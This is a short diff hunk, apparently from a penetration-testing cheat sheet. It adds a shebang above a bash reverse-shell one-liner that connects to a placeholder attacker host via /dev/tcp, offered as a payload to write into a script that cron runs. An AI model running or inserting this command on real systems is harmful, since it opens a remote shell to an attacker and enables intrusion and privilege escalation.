@@ -32,6 +32,7 @@ def choice(a):
 - Edit an script running in a crontab:
 
 ```bash
+#!/bin/bash
 bash -i >& /dev/tcp/IP_ATTCK/PORT 0>&1
 ```
 
